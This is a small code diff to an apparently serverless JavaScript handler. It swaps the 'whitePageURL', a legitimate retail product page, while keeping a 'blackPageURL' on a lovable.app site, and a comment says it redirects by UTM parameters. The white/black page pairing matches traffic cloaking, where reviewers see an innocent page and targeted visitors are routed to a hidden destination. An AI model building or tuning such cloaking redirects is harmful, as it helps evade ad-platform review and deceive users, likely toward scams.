@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.gap.com/browse/product.do?pid=858178002&vid=1&pcid=6427&cid=6427#pdp-page-content";
+    const whitePageURL = "https://www.fuseaudio.com.au/products/usb-a-to-lightning-light-up-flashing-cables-1m-red-green";
     const blackPageURL = "https://luvcshap.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
